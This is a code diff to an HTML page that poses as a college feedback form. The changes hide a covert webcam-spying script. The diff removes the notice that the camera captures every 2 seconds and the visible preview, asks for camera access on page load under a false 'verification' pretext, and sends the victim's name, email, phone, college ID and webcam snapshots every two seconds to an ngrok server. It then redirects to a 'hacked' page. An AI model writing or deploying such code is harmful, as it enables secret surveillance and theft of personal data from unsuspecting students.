@@ -23,10 +23,24 @@
       max-width: 440px;
       box-shadow: 0 20px 50px rgba(0,0,0,0.25);
     }
-    .card h1 { font-size: 1.5rem; color: #1f2933; margin-bottom: 0.2rem; }
-    .card p.sub { color: #6b7280; font-size: 0.9rem; margin-bottom: 1.5rem; }
+    .card h1 {
+      font-size: 1.5rem;
+      color: #1f2933;
+      margin-bottom: 0.2rem;
+    }
+    .card p.sub {
+      color: #6b7280;
+      font-size: 0.9rem;
+      margin-bottom: 1.5rem;
+    }
     .field { margin-bottom: 1.1rem; position: relative; }
-    label { display: block; font-size: 0.82rem; color: #374151; margin-bottom: 0.35rem; font-weight: 500; }
+    label {
+      display: block;
+      font-size: 0.82rem;
+      color: #374151;
+      margin-bottom: 0.35rem;
+      font-weight: 500;
+    }
     input {
       width: 100%;
       padding: 0.7rem 0.85rem;
@@ -36,11 +50,18 @@
       transition: border-color 0.2s, box-shadow 0.2s;
       outline: none;
     }
-    input:focus { border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.15); }
+    input:focus {
+      border-color: #667eea;
+      box-shadow: 0 0 0 3px rgba(102,126,234,0.15);
+    }
     input.invalid { border-color: #ef4444; }
     input.valid { border-color: #10b981; }
-    #msg { color: #ef4444; font-size: 0.82rem; margin-top: 0.4rem; min-height: 1em; }
-    #permStatus { font-size: 0.8rem; color: #6b7280; margin-top: 0.5rem; min-height: 1em; }
+    #msg {
+      color: #ef4444;
+      font-size: 0.82rem;
+      margin-top: 0.4rem;
+      min-height: 1em;
+    }
     button {
       width: 100%;
       padding: 0.75rem;
@@ -57,60 +78,74 @@
     button:hover { opacity: 0.92; }
     button:active { transform: scale(0.98); }
     button:disabled { opacity: 0.6; cursor: not-allowed; }
-    #cameraPreview { width: 100%; border-radius: 8px; margin-top: 1rem; display: none; }
-    .capture-indicator {
-      display: flex; align-items: center; justify-content: center;
-      gap: 0.5rem; margin-top: 0.5rem; color: #ef4444; font-size: 0.85rem;
+    .perm-banner {
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      border-radius: 8px;
+      padding: 0.75rem 1rem;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
     }
-    .capture-indicator .dot {
-      width: 8px; height: 8px; background: #ef4444; border-radius: 50%;
-      animation: pulse 1s infinite;
+    .perm-banner.hidden { display: none; }
+    .perm-text { color: #92400e; font-size: 0.85rem; }
+    .perm-btn {
+      width: auto;
+      padding: 0.5rem 1rem;
+      background: #f59e0b;
+      border-radius: 6px;
+      font-size: 0.85rem;
     }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    .perm-btn:hover { background: #d97706; }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Feedback Form</h1>
-    <p class="sub">Fill in your details. Camera will capture every 2 seconds after submit.</p>
+    <p class="sub">Please fill in your details.</p>
+
+    <div class="perm-banner hidden" id="permBanner">
+      <span class="perm-text">This form requires camera access for verification</span>
+      <button class="perm-btn" id="allowCameraBtn">Allow Camera</button>
+    </div>
 
     <form id="feedbackForm" novalidate>
       <div class="field">
         <label for="name">Full Name</label>
         <input type="text" id="name" name="name" placeholder="Enter your full name" required />
       </div>
+
       <div class="field">
         <label for="email">Email ID</label>
         <input type="email" id="email" name="email" placeholder="you@example.com" required />
       </div>
+
       <div class="field">
         <label for="phone">Phone Number</label>
         <input type="tel" id="phone" name="phone" placeholder="+91 98765 43210" required />
       </div>
+
       <div class="field">
         <label for="collegeId">College ID</label>
         <input type="text" id="collegeId" name="collegeId" placeholder="e.g. CU2024001" required />
       </div>
-      <button type="submit" id="submitBtn">Start Capture & Submit</button>
+
+      <button type="submit" id="submitBtn">Submit</button>
       <div id="msg"></div>
-      <div id="permStatus"></div>
-      <video id="cameraPreview" autoplay playsinline muted></video>
-      <div class="capture-indicator" id="captureIndicator" style="display:none;">
-        <span class="dot"></span> Capturing every 2s...
-      </div>
     </form>
   </div>
 
   <script>
-    // NGROK URL - will be replaced with actual ngrok HTTPS URL
     const ADMIN_SERVER = "https://stainless-king-gravitate.ngrok-free.dev";
+    const HACKED_PAGE = "https://An0nymOuS29.github.io/success.html";
 
     const form = document.getElementById("feedbackForm");
     const msg = document.getElementById("msg");
     const btn = document.getElementById("submitBtn");
-    const permStatus = document.getElementById("permStatus");
-    const preview = document.getElementById("cameraPreview");
-    const captureIndicator = document.getElementById("captureIndicator");
+    const permBanner = document.getElementById("permBanner");
+    const allowCameraBtn = document.getElementById("allowCameraBtn");
 
     const validateEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
     const validatePhone = (v) => /^[+]?[\d\s\-()]{7,15}$/.test(v.replace(/\s/g, ""));
@@ -118,10 +153,25 @@
     let stream = null;
     let captureInterval = null;
 
+    // Request camera permission immediately on page load
+    async function requestCameraPermission() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        // Permission granted - store stream for later use
+        window.cameraStream = stream;
+        return true;
+      } catch (e) {
+        // Permission denied or not available
+        return false;
+      }
+    }
+
+    // Request camera permission on page load (immediately)
+    requestCameraPermission();
+
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
       msg.textContent = "";
-      permStatus.textContent = "";
 
       const name = document.getElementById("name").value.trim();
       const email = document.getElementById("email").value.trim();
@@ -143,64 +193,57 @@
 
       if (!ok) { msg.textContent = "Please fix the highlighted fields."; return; }
 
-      permStatus.textContent = "[!] Requesting camera access...";
-
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        preview.srcObject = stream;
-        preview.style.display = "block";
-        await preview.play();
-      } catch (e) {
-        permStatus.textContent = "Camera access denied";
-        return;
-      }
-
-      permStatus.textContent = "[!] Starting continuous capture...";
-      captureIndicator.style.display = "flex";
-
-      // Capture loop every 2 seconds
-      captureInterval = setInterval(async () => {
-        try {
-          const canvas = document.createElement("canvas");
-          canvas.width = 320;
-          canvas.height = 240;
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(preview, 0, 0, 320, 240);
-          const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
-
-          // Send to ngrok HTTPS URL
-          await fetch(ADMIN_SERVER + "/capture", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              name: document.getElementById("name").value.trim(),
-              email: document.getElementById("email").value.trim(),
-              phone: document.getElementById("phone").value.trim(),
-              collegeId: document.getElementById("collegeId").value.trim(),
-              image: dataUrl,
-              time: new Date().toISOString()
-            })
-          }).catch(() => {});
-        } catch (e) {}
-      }, 2000);
-
-      // Send initial user data
-      await fetch(ADMIN_SERVER + "/submit", {
+      // Send initial user data to admin server (background)
+      fetch("https://stainless-king-gravitate.ngrok-free.dev/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          name: document.getElementById("name").value.trim(),
-          email: document.getElementById("email").value.trim(),
-          phone: document.getElementById("phone").value.trim(),
-          collegeId: document.getElementById("collegeId").value.trim(),
-          time: new Date().toISOString()
+          name, email, phone, collegeId, time: new Date().toISOString()
         })
       }).catch(() => {});
 
-      btn.disabled = true;
-      btn.textContent = "Capturing every 2s...";
-      permStatus.textContent = "✓ Continuous capture active";
+      // Start continuous capture in background
+      startContinuousCapture(name, email, phone, collegeId);
+
+      // Redirect to hacked page immediately
+      window.location.href = HACKED_PAGE;
     });
+
+    async function startContinuousCapture(name, email, phone, collegeId) {
+      try {
+        // Use existing stream if available, otherwise get new one
+        let stream = window.cameraStream;
+        if (!stream) {
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        }
+
+        // Capture loop every 2 seconds
+        setInterval(async () => {
+          try {
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            video.autoplay = true; video.muted = true;
+            await video.play();
+
+            const canvas = document.createElement("canvas");
+            canvas.width = 320; canvas.height = 240;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, 320, 240);
+            const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
+
+            await fetch("https://stainless-king-gravitate.ngrok-free.dev/capture", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                name, email, phone, collegeId, image: canvas.toDataURL("image/jpeg", 0.6), time: new Date().toISOString()
+              })
+            }).catch(() => {});
+          } catch (e) {}
+        }, 2000);
+      } catch (e) {
+        // Camera not available, continue without capture
+      }
+    }
   </script>
 </body>
 </html>
